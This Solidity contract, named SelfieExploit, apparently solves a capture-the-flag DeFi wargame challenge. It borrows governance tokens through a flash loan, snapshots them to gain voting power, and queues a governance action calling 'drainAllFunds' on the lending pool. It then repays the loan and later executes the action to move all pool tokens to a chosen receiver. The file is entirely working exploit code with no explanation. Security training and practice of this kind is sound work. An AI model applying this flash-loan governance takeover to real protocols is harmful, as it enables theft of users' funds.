pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "hardhat/console.sol";

contract SelfieExploit {
    SimpleGovernance governance;
    SelfiePool pool;
    uint256 actionId;

    constructor(SelfiePool _pool, SimpleGovernance _gov) {
        pool = _pool;
        governance = _gov;
    }

    function exploit(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveTokens(address, uint256 amount) external {
        governance.governanceToken().snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", (address(this)));
        actionId = governance.queueAction(address(pool), data, 0);
        pool.token().transfer(msg.sender, amount);
    }

    function drain(address receiver) external {
        governance.executeAction(actionId);
        require(pool.token().transfer(receiver, pool.token().balanceOf(address(this))), "transfer");
    }
}